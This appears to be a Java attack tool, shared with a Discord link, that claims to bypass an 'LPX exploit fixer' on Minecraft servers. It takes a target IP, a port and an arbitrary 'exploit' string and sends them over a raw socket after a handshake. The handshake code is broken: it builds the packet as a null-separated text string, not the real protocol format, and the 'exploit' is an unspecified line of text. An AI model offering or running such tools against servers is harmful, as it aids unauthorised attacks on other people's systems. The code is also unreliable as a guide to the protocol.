// Soruce Create By Minecraft Game
//  Discord : https://discord.gg/wsytzxtgHD

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.println("Enter Minecraft Server IP Address:");
        String ipAddress = scanner.nextLine();

        System.out.println("Enter Minecraft Server Port:");
        int port = scanner.nextInt();
        scanner.nextLine();

        System.out.println("Enter Exploit Hash (or command):");
        String exploitHash = scanner.nextLine();

        System.out.println("Attempting to bypass LPX exploit fixer and execute exploit...");

        try (Socket socket = new Socket(ipAddress, port);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            byte[] handshakePacket = createHandshakePacket(ipAddress, port, 47);

            out.write(new String(handshakePacket, StandardCharsets.UTF_8));
            out.flush();

            if (in.ready()) {
                String response = in.readLine();
                System.out.println("Server Response to Handshake: " + response);
            } else {
                System.out.println("No response received from server after handshake.");
            }

            out.println(exploitHash);
            out.flush();

            String response = in.readLine();
            System.out.println("Server Response to Exploit: " + response);

        } catch (IOException e) {
            System.err.println("Error communicating with the server: " + e.getMessage());
            e.printStackTrace();
        }
        System.out.println("Exploit attempt finished.");
    }

    private static byte[] createHandshakePacket(String ip, int port, int protocolVersion) throws IOException {

        String handshakeString = "\u0000" + protocolVersion + "\u0000" + ip + "\u0000" + port + "\u0000" + 1;
        byte[] handshakeBytes = handshakeString.getBytes(StandardCharsets.UTF_8);
        int length = handshakeBytes.length;

        byte[] lengthBytes = encodeVarInt(length);

        byte[] packet = new byte[lengthBytes.length + handshakeBytes.length];
        System.arraycopy(lengthBytes, 0, packet, 0, lengthBytes.length);
        System.arraycopy(handshakeBytes, 0, packet, lengthBytes.length, handshakeBytes.length);

        return packet;
    }

    private static byte[] encodeVarInt(int value) {
        java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
        while (true) {
            if ((value & 0xFFFFFF80) == 0) {
                outputStream.write(value);
                break;
            }
            outputStream.write((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        return outputStream.toByteArray();
    }
}
